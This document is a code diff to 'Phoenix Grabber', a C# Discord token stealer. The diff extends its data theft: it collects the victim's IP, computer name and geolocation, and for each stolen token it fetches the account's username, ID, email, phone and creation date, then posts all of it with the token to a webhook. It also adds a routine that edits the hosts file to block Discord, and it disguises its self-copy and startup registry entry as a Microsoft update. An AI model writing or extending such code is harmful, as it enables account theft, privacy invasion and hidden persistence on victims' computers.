@@ -30,6 +30,7 @@ namespace Program
             SendInfo();
             //SpreadMode
             //RunOnStartup
+            //BlockDiscord
             //FakeError
         }
         #endregion
@@ -128,13 +129,19 @@ namespace Program
         #region Send Info
         static void SendInfo()
         {
-            Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | " + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") + "\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"IP Address\",\"value\":\"" + IP() + "\"},{\"name\":\"Computer Name\",\"value\":\"" + Environment.MachineName + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
+            Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | " + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") + "\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"IP Address\",\"value\":\"" + IP() + "\"},{\"name\":\"Computer Name\",\"value\":\"" + Environment.MachineName + "\"},{\"name\":\"Location\",\"value\":\"" + Location() + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
             if (tokens.Count != 0)
             {
                 foreach (string token in tokens)
                 {
                     var request = Request("/users/@me", "GET", token);
                     dynamic info = new JavaScriptSerializer().DeserializeObject(request);
+                    var id = info["id"];
+                    if (string.IsNullOrEmpty(id))
+                        id = "N/A";
+                    var username = info["username"] + "#" + info["discriminator"];
+                    if (string.IsNullOrEmpty(username))
+                        username = "N/A";
                     var email = info["email"];
                     if (string.IsNullOrEmpty(email))
                         email = "N/A";
@@ -146,10 +153,42 @@ namespace Program
                     var status = info2["status"];
                     if (string.IsNullOrEmpty(status))
                         status = "N/A";
-                    Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"Email\",\"value\":\"" + email + "\"},{\"name\":\"Phone Number\",\"value\":\"" + phone + "\"},{\"name\":\"Status\",\"value\":\"" + status + "\"},{\"name\":\"Token\",\"value\":\"" + token + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
+                    var creationdate = DateTimeOffset.FromUnixTimeMilliseconds((Convert.ToInt64(id) >> 22) + 1420070400000).DateTime.ToString();
+                    Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"Username\",\"value\":\"" + username + "\"},{\"name\":\"ID\",\"value\":\"" + id + "\"},{\"name\":\"Email\",\"value\":\"" + email + "\"},{\"name\":\"Phone Number\",\"value\":\"" + phone + "\"},{\"name\":\"Status\",\"value\":\"" + status + "\"},{\"name\":\"Creation Date\",\"value\":\"" + creationdate + "\"},{\"name\":\"Token\",\"value\":\"" + token + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
                     Thread.Sleep(200);
                 }
             }
+        }
+        #endregion
+
+        #region Block Discord
+        static void BlockDiscord()
+        {
+            try
+            {
+                if (!File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts").Contains("discord"))
+                {
+                    string[] domains = { "discord", "support.discord", "canary.discord", "ptb.discord" };
+                    foreach (var domain in domains)
+                    {
+                        using (StreamWriter writer = File.AppendText(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts"))
+                            writer.WriteLine("\n0.0.0.0 " + domain + ".com");
+                    }
+                }
+            }
+            catch { }
+        }
+        #endregion
+
+        #region Location
+        static string Location()
+        {
+            try
+            {
+                var info = new WebClient().DownloadString("https://www.geodatatool.com/");
+                return (((info.Split('\n')[474]).Split('>'))[1]).Split('<')[0] + ", " + (((info.Split('\n')[469]).Split('>'))[1]).Split('<')[0] + ", " + info.Split('\n')[458].Trim();
+            }
+            catch { return "N/A"; }
         }
         #endregion
 
@@ -203,7 +242,7 @@ namespace Program
         {
             string text = "";
             ServicePointManager.Expect100Continue = true;
-            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
             WebRequest request;
             if (auth != null)
             {
@@ -267,7 +306,7 @@ namespace Program
         #region Run On Startup
         static void RunOnStartup()
         {
-            try { RegistryKey startup = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); startup.SetValue("Updater", Assembly.GetExecutingAssembly().Location); } catch { }
+            try { File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Update.exe"); RegistryKey startup = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); startup.SetValue("Microsoft", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Update.exe"); } catch { }
         }
         #endregion
     }
